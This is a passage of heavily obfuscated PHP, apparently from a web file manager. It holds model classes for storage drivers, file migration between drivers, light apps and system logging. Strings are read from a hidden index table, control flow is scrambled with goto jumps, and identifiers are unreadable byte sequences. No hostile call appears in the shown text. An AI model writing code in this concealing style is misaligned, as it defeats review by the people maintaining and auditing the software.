parent::listData($b“õ¿©ï¼÷, $AŠ–á·²ò®, $A÷èœ¤š); if ($b“õ¿©ï¼÷) { return $cİÍä‡ªİÜ; } goto bŞ½ò¦™ï; EÏ¶…‡ø‚Œ: return $cİÍä‡ªİÜ; goto e´ğ­”Æò; e´ğ­”Æò: } public function _listAppendSize(&$bğØ†‚»Œ­, $Fåè†àÄÏ²) { $DÉØÌ†š‘¡ =& $_SERVER[í…¶]; if (!$Fåè†àÄÏ²) { return; } $EÜÁ°˜Ó¦ = $DÉØÌ†š‘¡[2365] . implode($DÉØÌ†š‘¡[47], $Fåè†àÄÏ²) . $DÉØÌ†š‘¡[2366]; $d·÷›¤­¥œ = Model($DÉØÌ†š‘¡[721])->query($EÜÁ°˜Ó¦); $d·÷›¤­¥œ = array_to_keyvalue($d·÷›¤­¥œ, $DÉØÌ†š‘¡[376], $DÉØÌ†š‘¡[77]); foreach ($bğØ†‚»Œ­ as $eÇ¡ÛÉ—£ê => $C¬¿ù”Óˆ) { $bğØ†‚»Œ­[$eÇ¡ÛÉ—£ê][$DÉØÌ†š‘¡[2087]] = isset($d·÷›¤­¥œ[$C¬¿ù”Óˆ[$DÉØÌ†š‘¡[376]]]) ? $d·÷›¤­¥œ[$C¬¿ù”Óˆ[$DÉØÌ†š‘¡[376]]] : 0; } } public function getConfig($FïÑ…ğƒ½â) { $FÒ…“˜ŞÇß = parent::listData($FïÑ…ğƒ½â); return json_decode($FÒ…“˜ŞÇß[$_SERVER[í…¶][6]], !0); } public function update($D±è´·…³, $Bâ„‚ôÉ) { goto d‘©çĞ ã‹; d‘©çĞ ã‹: $E‘èŸë½Ò‰ =& $_SERVER[í…¶]; $E¿ã²’‡ì = $Bâ„‚ôÉ[$E‘èŸë½Ò‰[28]]; $bŠãöÑÏÂ = array_to_keyvalue(parent::listData(), $E‘èŸë½Ò‰[28]); goto c±’Ñ¹ï÷ö; c±’Ñ¹ï÷ö: if (isset($bŠãöÑÏÂ[$E¿ã²’‡ì]) && $bŠãöÑÏÂ[$E¿ã²’‡ì][$E‘èŸë½Ò‰[376]] != $D±è´·…³) { return !1; } if (isset($Bâ„‚ôÉ[$E‘èŸë½Ò‰[2367]]) && $Bâ„‚ôÉ[$E‘èŸë½Ò‰[2367]] == $E‘èŸë½Ò‰[83]) { $this->checkConfig($Bâ„‚ôÉ); } unset($Bâ„‚ôÉ[$E‘èŸë½Ò‰[2367]]); goto A©¼Ê¡Ò¹; A©¼Ê¡Ò¹: $DŠš÷÷°»  = parent::update($D±è´·…³, $Bâ„‚ôÉ); if ($DŠš÷÷°»  && $Bâ„‚ôÉ[$E‘èŸë½Ò‰[34]]) { foreach ($bŠãöÑÏÂ as $bÉ‰¾ÆÍŠæ) { if ($bÉ‰¾ÆÍŠæ[$E‘èŸë½Ò‰[34]] && $bÉ‰¾ÆÍŠæ[$E‘èŸë½Ò‰[376]] != $D±è´·…³) { parent::update($bÉ‰¾ÆÍŠæ[$E‘èŸë½Ò‰[376]], array($E‘èŸë½Ò‰[34] => 0)); } } } return $DŠš÷÷°» ; goto AâîâŠ‡Æ‰; AâîâŠ‡Æ‰: } public function add($C’Œ¡Ô£) { goto BòäÌ¬¨À™; EÃÌÎ¸ªÄ: $this->checkConfig($C’Œ¡Ô£); $eÜá‹°§ˆè = parent::insert($C’Œ¡Ô£); if ($eÜá‹°§ˆè && $C’Œ¡Ô£[$f—Ô¯¥å¡[34]]) { foreach ($b–Ÿ¦¼àŞ½ as $dŒ¥åœõö) { if ($dŒ¥åœõö[$f—Ô¯¥å¡[34]]) { parent::update($dŒ¥åœõö[$f—Ô¯¥å¡[376]], array($f—Ô¯¥å¡[34] => 0)); } } } goto AÏŸÚóæŒ; AÏŸÚóæŒ: return $eÜá‹°§ˆè; goto Dï¦¬Î¶ñÏ; BòäÌ¬¨À™: $f—Ô¯¥å¡ =& $_SERVER[í…¶]; $b–Ÿ¦¼àŞ½ = array_to_keyvalue(parent::listData(), $f—Ô¯¥å¡[28]); if (isset($b–Ÿ¦¼àŞ½[$C’Œ¡Ô£[$f—Ô¯¥å¡[28]]])) { return !1; } goto EÃÌÎ¸ªÄ; Dï¦¬Î¶ñÏ: } public function checkConfig(&$aì˜„¸å‡) { goto c“Œ¶±¿³; BÁ‰Æ½»š…: $B­Ş¶İ© î = rtrim($dªñŠÓø¾Ï[$eíå¿¦”ë›[1022]], $eíå¿¦”ë›[8]) . $eíå¿¦”ë›[8]; $b„·ãÍ‰ºÙ = $A×†æ‹´->getPath($B­Ş¶İ© î . $eíå¿¦”ë›[1982]); if (!$A×†æ‹´->mkfile($b„·ãÍ‰ºÙ)) { show_json(LNG($eíå¿¦”ë›[2369]), !1); } goto CçÊ’àÃ«; F÷¢½‹®¢: foreach ($dªñŠÓø¾Ï as $FÆÏİ¥º¢ => $a¯ğäëË‘) { $dªñŠÓø¾Ï[$FÆÏİ¥º¢] = trim($a¯ğäëË‘); } $dªñŠÓø¾Ï[$eíå¿¦”ë›[2368]] = rand_string(6); $b ù—÷¬Ó = $this->driverType($fä¤“â¯‚Ù); goto CöêŒÚââ; CöêŒÚââ: $dØçÕòŒË³ = $eíå¿¦”ë›[71] . $b ù—÷¬Ó; $A×†æ‹´ = new $dØçÕòŒË³($dªñŠÓø¾Ï); if (in_array($fä¤“â¯‚Ù, $A×†æ‹´->objectDriver)) { if (!$A×†æ‹´->isBucketCors() && !$A×†æ‹´->setBucketCors()) { $d¡ÜÁĞòİ‹ = LNG($eíå¿¦”ë›[2369]); $d¡ÜÁĞòİ‹ .= $eíå¿¦”ë›[2370] . LNG($eíå¿¦”ë›[2371]); show_json($d¡ÜÁĞòİ‹, !1); } } goto BÁ‰Æ½»š…; c“Œ¶±¿³: $eíå¿¦”ë› =& $_SERVER[í…¶]; $fä¤“â¯‚Ù = strtolower($aì˜„¸å‡[$eíå¿¦”ë›[90]]); $dªñŠÓø¾Ï = json_decode($aì˜„¸å‡[$eíå¿¦”ë›[6]], !0); goto F÷¢½‹®¢; d¦Ûâä’ë: return !0; goto EãöÂ÷ÕæÄ; CçÊ’àÃ«: $dªñŠÓø¾Ï[$eíå¿¦”ë›[1022]] = $B­Ş¶İ© î; $aì˜„¸å‡[$eíå¿¦”ë›[6]] = json_encode($dªñŠÓø¾Ï); $aì˜„¸å‡[$eíå¿¦”ë›[90]] = $b ù—÷¬Ó; goto d¦Ûâä’ë; EãöÂ÷ÕæÄ: } private function driverType($eÁİ²“¶ƒ‡) { $b²óÕõ§ğ“ =& $_SERVER[í…¶]; $D´¸Âà¡Áá = array($b²óÕõ§ğ“[102] => $b²óÕõ§ğ“[2372], $b²óÕõ§ğ“[58] => $b²óÕõ§ğ“[2373], $b²óÕõ§ğ“[64] => $b²óÕõ§ğ“[2374]); if (isset($D´¸Âà¡Áá[$eÁİ²“¶ƒ‡])) { return $D´¸Âà¡Áá[$eÁİ²“¶ƒ‡]; } return strtoupper($eÁİ²“¶ƒ‡); } public function driverListSystem() { $aøõ˜ØÉíÚ =& $_SERVER[í…¶]; $AÆŒÀ¶‹£˜ = parent::listData(); $fáİ’Ÿ¢° = array(); foreach ($AÆŒÀ¶‹£˜ as $BÎÃŠ±ª¶) { unset($BÎÃŠ±ª¶[$aøõ˜ØÉíÚ[187]], $BÎÃŠ±ª¶[$aøõ˜ØÉíÚ[107]]); $BÎÃŠ±ª¶[$aøõ˜ØÉíÚ[6]] = json_decode($BÎÃŠ±ª¶[$aøõ˜ØÉíÚ[6]], !0); $fáİ’Ÿ¢°[] = $BÎÃŠ±ª¶; } return $fáİ’Ÿ¢°; } public function defaultDriver() { $E—ÛÜ¥Ç’ó =& $_SERVER[í…¶]; $A¹ÌŒø½› = parent::listData(); $d‹õ”ò·¿ = array_filter_by_field($A¹ÌŒø½›, $E—ÛÜ¥Ç’ó[34], 1); $d‹õ”ò·¿ = $d‹õ”ò·¿[0]; if ($d‹õ”ò·¿) { $d‹õ”ò·¿[$E—ÛÜ¥Ç’ó[6]] = json_decode($d‹õ”ò·¿[$E—ÛÜ¥Ç’ó[6]], !0); } return $d‹õ”ò·¿; } public function driverInfo($Aï½²³Ï¥) { $DÉéøÑ“ˆ¹ =& $_SERVER[í…¶]; $EôÀš™¸È = array_to_keyvalue(parent::listData(), $DÉéøÑ“ˆ¹[376]); if (!isset($EôÀš™¸È[$Aï½²³Ï¥])) { return !1; } $DÜÃ²Æ¡Ç = $EôÀš™¸È[$Aï½²³Ï¥]; $DÜÃ²Æ¡Ç[$DÉéøÑ“ˆ¹[6]] = json_decode($DÜÃ²Æ¡Ç[$DÉéøÑ“ˆ¹[6]], !0); return $DÜÃ²Æ¡Ç; } public function remove($c…¿Í‹º˜¼) { $this->removeShareItems($c…¿Í‹º˜¼); return parent::remove($c…¿Í‹º˜¼); } public function removeWithFile($d”‚‚ªã«Ù) { goto bßïé ÜÜ; D’èÅ¸¡½¾: $FÁæ¯¥õÁ = Model($dö¤Ÿ±ñ¿¾[167])->where($A³×‰ÎåÑ)->field($dö¤Ÿ±ñ¿¾[2378])->select(); foreach ($FÁæ¯¥õÁ as $FáåŒ²Ÿ) { goto Eí†„´†ˆ°; EÖ÷¿Ì»‘¦: $AÌĞíÁéè = array($dö¤Ÿ±ñ¿¾[746] => $EˆÌÔ÷ÔÉÔ, $dö¤Ÿ±ñ¿¾[75] => $dÙ½ê§©Œ); Model($dö¤Ÿ±ñ¿¾[167])->where($A³×‰ÎåÑ)->save($AÌĞíÁéè); goto cî­º§ÇÊ; Eí†„´†ˆ°: $B‘µ°«ŸæÑ = $FáåŒ²Ÿ[$dö¤Ÿ±ñ¿¾[75]]; $dÙ½ê§©Œ = $Dö¨á¡øÌ . str_replace("\173\x69\x6f\72{$d”‚‚ªã«Ù}\x7d\x2f", $dö¤Ÿ±ñ¿¾[33], $B‘µ°«ŸæÑ); if (!IO::exist($B‘µ°«ŸæÑ)) { $E‰Ú®¹†Âã[] = $FáåŒ²Ÿ[$dö¤Ÿ±ñ¿¾[428]]; $BÚÜŸæ´Ô->updateFileEnd($FáåŒ²Ÿ[$dö¤Ÿ±ñ¿¾[28]], $FáåŒ²Ÿ[$dö¤Ÿ±ñ¿¾[77]]); continue; } goto eÓ›Ûóµ°Ü; eÓ›Ûóµ°Ü: if (IO::exist($dÙ½ê§©Œ)) { $BÚÜŸæ´Ô->updateFileEnd($FáåŒ²Ÿ[$dö¤Ÿ±ñ¿¾[28]], $FáåŒ²Ÿ[$dö¤Ÿ±ñ¿¾[77]]); continue; } if (!IO::move($B‘µ°«ŸæÑ, get_path_father($dÙ½ê§©Œ))) { $D“æ±Ûù¸ê = !1; break; } $A³×‰ÎåÑ = array($dö¤Ÿ±ñ¿¾[428] => $FáåŒ²Ÿ[$dö¤Ÿ±ñ¿¾[428]]); goto EÖ÷¿Ì»‘¦; cî­º§ÇÊ: } $this->removeByFileID($E‰Ú®¹†Âã); goto c½©æ ï»; Fç»ø½¾‡: $BÚÜŸæ´Ô->task[$dö¤Ÿ±ñ¿¾[700]] = (double) $c‹£ÆË¸•; $Bº…ÍŒÜÃ• = KodIO::defaultDriver(); $EˆÌÔ÷ÔÉÔ = $Bº…ÍŒÜÃ•[$dö¤Ÿ±ñ¿¾[376]]; goto DÖ‘©ƒò²·; eÀ‚·ÌŠ‚§: $c‹£ÆË¸• = Model($dö¤Ÿ±ñ¿¾[431])->where($A³×‰ÎåÑ)->sum($dö¤Ÿ±ñ¿¾[77]); $fÍÄòÊëó¡ = $dö¤Ÿ±ñ¿¾[2375] . $d”‚‚ªã«Ù; $BÚÜŸæ´Ô = new TaskFileTransfer($fÍÄòÊëó¡, $dö¤Ÿ±ñ¿¾[2376], $dœº‰›â‚Š, LNG($dö¤Ÿ±ñ¿¾[2377]) . "\50{$d”‚‚ªã«Ù}\51"); goto Fç»ø½¾‡; c½©æ ï»: if (!$D“æ±Ûù¸ê) { $BÚÜŸæ´Ô->stop($fÍÄòÊëó¡); return !1; } $BÚÜŸæ´Ô->end(); $this->remove($d”‚‚ªã«Ù); goto Cé¡§ºœĞ·; DÖ‘©ƒò²·: $Dö¨á¡øÌ = "\x7b\x69\157\x3a{$EˆÌÔ÷ÔÉÔ}\x7d\57"; $D“æ±Ûù¸ê = !0; $E‰Ú®¹†Âã = array(); goto D’èÅ¸¡½¾; bßïé ÜÜ: $dö¤Ÿ±ñ¿¾ =& $_SERVER[í…¶]; $A³×‰ÎåÑ = array($dö¤Ÿ±ñ¿¾[746] => $d”‚‚ªã«Ù); $dœº‰›â‚Š = Model($dö¤Ÿ±ñ¿¾[431])->where($A³×‰ÎåÑ)->count(); goto eÀ‚·ÌŠ‚§; Cé¡§ºœĞ·: } public function progress($f™Úòä†¡Ä) { return Task::get($_SERVER[í…¶][2375] . $f™Úòä†¡Ä); } private function removeByFileID($D¬·¿”ïÇ = array()) { goto dóŠàõ…Ï´; Eéªš½”Ê: $Cç‹èÑ‘®  = Model($E‚õË÷ËÙĞ[1115])->where($DÍ³³™»Ë)->field($E‚õË÷ËÙĞ[378])->select(); if (!$Cç‹èÑ‘® ) { return; } $Cç‹èÑ‘®  = array_to_keyvalue($Cç‹èÑ‘® , $E‚õË÷ËÙĞ[33], $E‚õË÷ËÙĞ[378]); goto BîôÏ°‹ê; BîôÏ°‹ê: foreach ($Cç‹èÑ‘®  as $Dğµ—Ì—î‰) { Model($E‚õË÷ËÙĞ[391])->removeNow($Dğµ—Ì—î‰, !1); } goto c‹íÛ»™ÉĞ; dóŠàõ…Ï´: $E‚õË÷ËÙĞ =& $_SERVER[í…¶]; if (empty($D¬·¿”ïÇ)) { return; } $DÍ³³™»Ë = array($E‚õË÷ËÙĞ[428] => array($E‚õË÷ËÙĞ[7], $D¬·¿”ïÇ)); goto Eéªš½”Ê; c‹íÛ»™ÉĞ: } private function removeShareItems($b½¶ŞÈ†õĞ) { goto C¾ÏğçæÀ’; dÓ‚µô¿‹: $aäÁÓ‡Í  = Model($aùÈ¡´ñš[2078])->where($F‡¨”Òá×)->field($aùÈ¡´ñš[450])->select(); if (empty($aäÁÓ‡Í )) { return; } $B½®•ïÕéù = array_to_keyvalue($aäÁÓ‡Í , $aùÈ¡´ñš[33], $aùÈ¡´ñš[450]); goto C™¼Çô¥´±; C™¼Çô¥´±: Model($aùÈ¡´ñš[545])->remove($B½®•ïÕéù); goto D™Ø‚×çÃ•; C¾ÏğçæÀ’: $aùÈ¡´ñš =& $_SERVER[í…¶]; $AÜÔ• ÅæŠ = "\x7b\151\157\x3a{$b½¶ŞÈ†õĞ}\175\x2f"; $F‡¨”Òá× = array($aùÈ¡´ñš[378] => 0, $aùÈ¡´ñš[1017] => array($aùÈ¡´ñš[754], "{$AÜÔ• ÅæŠ}\x25")); goto dÓ‚µô¿‹; D™Ø‚×çÃ•: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\155\x2e\x4c\x69\x67\150\164\101\160\160"; public $modelType = "\x53\171\163\164\x65\x6d\x4f\x70\164\x69\x6f\x6e"; public $field = array("\x6e\x61\x6d\145", "\x67\162\x6f\165\160", "\x64\145\163\x63", "\x63\157\156\164\x65\156\x74"); public function listData($b§Ù‰‚÷Ê’ = false, $eˆ—ìÖÌÚ° = "\155\x6f\144\x69\x66\171\x54\151\x6d\x65", $dôù¶î®âà = true) { return parent::listData($b§Ù‰‚÷Ê’, $eˆ—ìÖÌÚ°, $dôù¶î®âà); } public function remove($D®ò™áæŒ) { $d»ìöø¹ç„ = $this->findByName($D®ò™áæŒ); if (!$d»ìöø¹ç„) { return !1; } return parent::remove($d»ìöø¹ç„[$_SERVER[í…¶][376]]); } public function add($A–¨åöê‡Š) { if ($this->findByName($A–¨åöê‡Š[$_SERVER[í…¶][28]])) { return !1; } return parent::insert($A–¨åöê‡Š); } public function update($F¤æˆ©Çª¼, $c÷´‰ÈÊ¾) { $DÖâìİÂÒõ =& $_SERVER[í…¶]; $dÌ…­ÈÅèº = $this->findByName($F¤æˆ©Çª¼); $A¸­âƒ¬·è = $this->findByName($c÷´‰ÈÊ¾[$DÖâìİÂÒõ[28]]); if (!$dÌ…­ÈÅèº || $A¸­âƒ¬·è && $A¸­âƒ¬·è[$DÖâìİÂÒõ[376]] != $dÌ…­ÈÅèº[$DÖâìİÂÒõ[376]]) { return !1; } return parent::update($dÌ…­ÈÅèº[$DÖâìİÂÒõ[376]], $c÷´‰ÈÊ¾); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\x73\x74\145\x6d\x5f\154\157\x67"; protected $dataAuto = array(array("\143\162\145\141\x74\x65\124\x69\155\x65", "\x74\x69\155\145", "\151\x6e\x73\145\x72\164", "\x66\165\156\x63\x74\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $B”Í’¥“ƒ– =& $_SERVER[í…¶]; return array($B”Í’¥“ƒ–[2379] => LNG($B”Í’¥“ƒ–[2380]), $B”Í’¥“ƒ–[2381] => LNG($B”Í’¥“ƒ–[2382]), $B”Í’¥“ƒ–[2040] => LNG($B”Í’¥“ƒ–[2383]), $B”Í’¥“ƒ–[2384] => LNG($B”Í’¥“ƒ–[2385]), $B”Í’¥“ƒ–[2386] => LNG($B”Í’¥“ƒ–[2387]), $B”Í’¥“ƒ–[2388] => LNG($B”Í’¥“ƒ–[2389]), $B”Í’¥“ƒ–[2390] => LNG($B”Í’¥“ƒ–[2391]), $B”Í’¥“ƒ–[2392] => LNG($B”Í’¥“ƒ–[2393]), $B”Í’¥“ƒ–[2071] => LNG($B”Í’¥“ƒ–[2394]), $B”Í’¥“ƒ–[2072] => LNG($B”Í’¥“ƒ–[2395]), $B”Í’¥“ƒ–[2396] => LNG($B”Í’¥“ƒ–[2397]), $B”Í’¥“ƒ–[2398] => LNG($B”Í’¥“ƒ–[2399]), $B”Í’¥“ƒ–[2400] => LNG($B”Í’¥“ƒ–[2401]), $B”Í’¥“ƒ–[2402] => LNG($B”Í’¥“ƒ–[2403]), $B”Í’¥“ƒ–[2069] => LNG($B”Í’¥“ƒ–[2404]), $B”Í’¥“ƒ–[2076] => LNG($B”Í’¥“ƒ–[2405]), $B”Í’¥“ƒ–[2406] => LNG($B”Í’¥“ƒ–[2407]), $B”Í’¥“ƒ–[2408] => LNG($B”Í’¥“ƒ–[2409]), $B”Í’¥“ƒ–[2410] => LNG($B”Í’¥“ƒ–[2411]), $B”Í’¥“ƒ–[2412] => LNG($B”Í’¥“ƒ–[2413]), $B”Í’¥“ƒ–[2079] => LNG($B”Í’¥“ƒ–[2414]), $B”Í’¥“ƒ–[2080] => LNG($B”Í’¥“ƒ–[2415]), $B”Í’¥“ƒ–[2416] => LNG($B”Í’¥“ƒ–[2417]), $B”Í’¥“ƒ–[2418] => LNG($B”Í’¥“ƒ–[2419]), $B”Í’¥“ƒ–[2420] => LNG($B”Í’¥“ƒ–[2421]), $B”Í’¥“ƒ–[2074] => LNG($B”Í’¥“ƒ–[2422]), $B”Í’¥“ƒ–[2423] => LNG($B”Í’¥“ƒ–[2424]), $B”Í’¥“ƒ–[2073] => LNG($B”Í’¥“ƒ–[2425]), $B”Í’¥“ƒ–[2426] => LNG($B”Í’¥“ƒ–[2427]), $B”Í’¥“ƒ–[2428] => LNG($B”Í’¥“ƒ–[2429]), $B”Í’¥“ƒ–[2430] => LNG($B”Í’¥“ƒ–[2430]), $B”Í’¥“ƒ–[2431] => LNG($B”Í’¥“ƒ–[2044]), $B”Í’¥“ƒ–[2432] => LNG($B”Í’¥“ƒ–[2433]), $B”Í’¥“ƒ–[2434] => LNG($B”Í’¥“ƒ–[2435]), $B”Í’¥“ƒ–[2436] => LNG($B”Í’¥“ƒ–[2437]), $B”Í’¥“ƒ–[2438] => LNG($B”Í’¥“ƒ–[2439]), $B”Í’¥“ƒ–[2440] => LNG($B”Í’¥“ƒ–[2441]), $B”Í’¥“ƒ–[2442] => LNG($B”Í’¥“ƒ–[2442]), $B”Í’¥“ƒ–[2443] => LNG($B”Í’¥“ƒ–[2444]), $B”Í’¥“ƒ–[2445] => LNG($B”Í’¥“ƒ–[2446]), $B”Í’¥“ƒ–[2447] => LNG($B”Í’¥“ƒ–[2448]), $B”Í’¥“ƒ–[2449] => LNG($B”Í’¥“ƒ–[2450]), $B”Í’¥“ƒ–[2451] => LNG($B”Í’¥“ƒ–[2452]), $B”Í’¥“ƒ–[2453] => LNG($B”Í’¥“ƒ–[2454])); } private function typeFile() { $A’¬îæÑ =& $_SERVER[í…¶]; $AÚ¿©–…ò“ = array($A’¬îæÑ[2076] => array($A’¬îæÑ[2077]), $A’¬îæÑ[2400] => array($A’¬îæÑ[2455]), $A’¬îæÑ[2402] => array($A’¬îæÑ[2456]), $A’¬îæÑ[2069] => array($A’¬îæÑ[2070]), $A’¬îæÑ[2408] => array(), $A’¬îæÑ[2410] => array(), $A’¬îæÑ[2412] => array(), $A’¬îæÑ[2079] => array($A’¬îæÑ[2081]), $A’¬îæÑ[2080] => array($A’¬îæÑ[2081]), $A’¬îæÑ[2416] => array($A’¬îæÑ[2457]), $A’¬îæÑ[2418] => array($A’¬îæÑ[2457]), $A’¬îæÑ[2420] => array($A’¬îæÑ[2458]), $A’¬îæÑ[2406] => array($A’¬îæÑ[2459]), $A’¬îæÑ[2074] => array($A’¬îæÑ[2460]), $A’¬îæÑ[2423] => array($A’¬îæÑ[2461]), $A’¬îæÑ[2073] => array($A’¬îæÑ[2075])); return $AÚ¿©–…ò“; } private function typeAll() { goto A¿¥Å†é; cÌî¦Šˆ§’: foreach ($D±„Øˆ‘‡° as $A¨®ÒÏ§²Ç => $B¬ÃÍİŒÎ¦) { $fÚ·‘î®î²[$B¬ÃÍİŒÎ¦[0]] = $fÚ·‘î®î²[$A¨®ÒÏ§²Ç]; } $fÚ·‘î®î²[$dÙ©Ê‹åç[2081]] = LNG($dÙ©Ê‹åç[2462]); $fÚ·‘î®î²[$dÙ©Ê‹åç[2457]] = LNG($dÙ©Ê‹åç[2463]); goto Dé Üö±­‘; A¿¥Å†é: $dÙ©Ê‹åç =& $_SERVER[í…¶]; $fÚ·‘î®î² = $this->typeList; $D±„Øˆ‘‡° = array_filter($this->typeFile()); goto cÌî¦Šˆ§’; Dé Üö±­‘: return $fÚ·‘î®î²; goto e‹¨¦Ã¯; e‹¨¦Ã¯: } public function addLog($AÀ©Âğ„õ±, $DÒ»„•¦ = array()) { goto C¢¢¬ŒİŠ; C¢¢¬ŒİŠ: $Eäô˜Ì³´ =& $_SERVER[í…¶]; if (!isset($this->typeList[$AÀ©Âğ„õ±])) { return; } $cĞ…šè¢¨¬ = USER_ID ? USER_ID : (isset($DÒ»„•¦[$Eäô˜Ì³´[1433]]) ? $DÒ»„•¦[$Eäô˜Ì³´[1433]] : 0); goto a—¶¯¿ Ä–; aÒ²½ôÕÚÏ: parent::add($DÒ»„•¦); goto CÅæ®Ö—ç; a—¶¯¿ Ä–: $EÅÇïî±ë« = get_client_ip(); if (!$DÒ»„•¦ || strlen(json_encode($DÒ»„•¦)) >= 1024) { $DÒ»„•¦ = array($Eäô˜Ì³´[2464] => $EÅÇïî±ë«); } else { if (is_array($DÒ»„•¦)) { $DÒ»„•¦[$Eäô˜Ì³´[2464]] = $EÅÇïî±ë«; } else { $DÒ»„•¦ = array($Eäô˜Ì³´[1032] => $DÒ»„•¦, $Eäô˜Ì³´[2464] => $EÅÇïî±ë«); } } $DÒ»„•¦ = array($Eäô˜Ì³´[1423] => Session::sign(), $Eäô˜Ì³´[1424] => $cĞ…šè¢¨¬, $Eäô˜Ì³´[29] => $AÀ©Âğ„õ±, $Eäô˜Ì³´[1426] => json_encode($DÒ»„•¦)); goto aÒ²½ôÕÚÏ; CÅæ®Ö—ç: } public function remove($C›êë—©¡´) { $this->where(array($_SERVER[í…¶][394] => $C›êë—©¡´))->delete(); } private function _makeOrder($FÓĞä…ÄÎ = '') { goto A‡´Šò•Œ; D©™Œ·ù: return $this->order($FÓĞä…ÄÎ); goto Böİ‹Á”ÉÃ; Aù•Å„Ù¨: $CÕƒ å†®ƒ = Input::get($dÂ…†…Ø¸[417], $dÂ…†…Ø¸[7], $dÂ…†…Ø¸[2242], array($dÂ…†…Ø¸[2178], $dÂ…†…Ø¸[413])); $CÕƒ å†®ƒ = $Fñìµº¼Šè[$CÕƒ å†®ƒ]; $FÓĞä…ÄÎ = $FÓĞä…ÄÎ . "{$fµ½¶Ûœä}\40{$CÕƒ å†®ƒ}"; goto D©™Œ·ù; A‡´Šò•Œ: $dÂ…†…Ø¸ =& $_SERVER[í…¶]; $fµ½¶Ûœä = $dÂ…†…Ø¸[187]; $Fñìµº¼Šè = array($dÂ…†…Ø¸[411] => $dÂ…†…Ø¸[412], $dÂ…†…Ø¸[413] => $dÂ…†…Ø¸[414]); goto Aù•Å„Ù¨; Böİ‹Á”ÉÃ: } public function get($Eµ­‘Õó¦Ë = '') { goto eêêÖ†Œ¹; eêêÖ†Œ¹: $Dš—­•ò­™ =& $_SERVER[í…¶]; if (!$Eµ­‘Õó¦Ë) { show_json(array()); } $DËÅˆ‹ó§¤ = array(); goto dÂºÌÚõÒ; eğìÑ¿‘­: if (!empty($Eµ­‘Õó¦Ë[$Dš—­•ò­™[2464]])) { $DËÅˆ‹ó§¤[$Dš—­•ò­™[414]] = array($Dš—­•ò­™[754], "\x25{$Eµ­‘Õó¦Ë[$Dš—­•ò­™[2464]]}\45"); } $A¯Æ†±¹„´ = $this->_makeOrder()->where($DËÅˆ‹ó§¤)->selectPage(); if (empty($A¯Æ†±¹„´[$Dš—­•ò­™[363]])) { show_json(array(), !0, $A¯Æ†±¹„´[$Dš—­•ò­™[360]]); } goto aêæòà÷¤¿; dÂºÌÚõÒ: if ($Eµ­‘Õó¦Ë[$Dš—­•ò­™[1433]]) { $DËÅˆ‹ó§¤[$Dš—­•ò­™[1433]] = $Eµ­‘Õó¦Ë[$Dš—­•ò­™[1433]]; } if (isset($Eµ­‘Õó¦Ë[$Dš—­•ò­™[704]])) { $AÍó˜¶¼ÎÀ = $Eµ­‘Õó¦Ë[$Dš—­•ò­™[704]]; $Cî¨·½ç  = isset($Eµ­‘Õó¦Ë[$Dš—­•ò­™[705]]) ? $Eµ­‘Õó¦Ë[$Dš—­•ò­™[705]] : time(); $DËÅˆ‹ó§¤[$Dš—­•ò­™[187]] = array($Dš—­•ò­™[321], array($AÍó˜¶¼ÎÀ, $Cî¨·½ç )); } if ($Eµ­‘Õó¦Ë[$Dš—­•ò­™[29]]) { $FÍ…èóˆƒ’ = explode($Dš—­•ò­™[47], $Eµ­‘Õó¦Ë[$Dš—­•ò­™[29]]); $bÜ¿ëº„¢Í = $this->typeFile(); $cØËÓ‘‘‰Á = array(); foreach ($FÍ…èóˆƒ’ as $b£‹ İ×) { $cØËÓ‘‘‰Á[] = $b£‹ İ×; if (isset($bÜ¿ëº„¢Í[$b£‹ İ×])) { $cØËÓ‘‘‰Á = array_merge($cØËÓ‘‘‰Á, $bÜ¿ëº„¢Í[$b£‹ İ×]); } } $cØËÓ‘‘‰Á = array_unique($cØËÓ‘‘‰Á); if ($cØËÓ‘‘‰Á) { $DËÅˆ‹ó§¤[$Dš—­•ò­™[29]] = array($Dš—­•ò­™[7], $cØËÓ‘‘‰Á); } } goto eğìÑ¿‘­; aêæòà÷¤¿: $A¯Æ†±¹„´[$Dš—­•ò­™[363]] = $this->logList($A¯Æ†±¹„´[$Dš—­•ò­™[363]]); return $A¯Æ†±¹„´; goto d²­ˆì°ì; d²­ˆì°ì: } private function ipAddress(&$fàˆ‰¢º) { $bëÊæøËó½ =& $_SERVER[í…¶]; if (!empty($fàˆ‰¢º[$bëÊæøËó½[2464]])) { $c«Û©¨¾¸Å = IpLocation::get($fàˆ‰¢º[$bëÊæøËó½[2464]]); } else { $c«Û©¨¾¸Å = LNG($bëÊæøËó½[2465]); } $fàˆ‰¢º[$bëÊæøËó½[2466]] = $c«Û©¨¾¸Å; } private function descZipDownload($aÁÏÚëÁÇ», &$B°»È„îÈ´) { $B¦ÚÕïÆŞ’ =& $_SERVER[í…¶]; if (!isset($aÁÏÚëÁÇ»[$B¦ÚÕïÆŞ’[2467]])) { return; } $a›‰µÒŠÇÈ = json_decode($aÁÏÚëÁÇ»[$B¦ÚÕïÆŞ’[2467]], !0); foreach ($a›‰µÒŠÇÈ as $Fù¡‹’öª) { if (!IO::init($Fù¡‹’öª[$B¦ÚÕïÆŞ’[75]])) { continue; } if (!($A–¬¬Øç = IO::infoFull($Fù¡‹’öª[$B¦ÚÕïÆŞ’[75]]))) { continue; } $aÁÏÚëÁÇ»[$B¦ÚÕïÆŞ’[75]] = $Fù¡‹’öª[$B¦ÚÕïÆŞ’[75]]; $B°»È„îÈ´[] = $aÁÏÚëÁÇ»[$B¦ÚÕïÆŞ’[378]] = $A–¬¬Øç[$B¦ÚÕïÆŞ’[378]]; $B°»È„îÈ´[] = $aÁÏÚëÁÇ»[$B¦ÚÕïÆŞ’[2285]] = $A–¬¬Øç[$B¦ÚÕïÆŞ’[470]]; break; } return $aÁÏÚëÁÇ»; } private function getSourceList(&$A‚â®öåòŞ) { $aëÚò©Â¯š =& $_SERVER[í…¶]; $E¦Ì‘²±Í… = array(); foreach ($A‚â®öåòŞ as $EéÆâœ— => $C£ÍòÈ‘îå) { goto dä„ß¾šïŒ; dä„ß¾šïŒ: $aõÛ¯ßÎ¾Ñ = json_decode($C£ÍòÈ‘îå[$aëÚò©Â¯š[414]], !0); if ($C£ÍòÈ‘îå[$aëÚò©Â¯š[29]] == $aëÚò©Â¯š[2072]) { $aõÛ¯ßÎ¾Ñ = $this->descZipDownload($aõÛ¯ßÎ¾Ñ, $E¦Ì‘²±Í…); 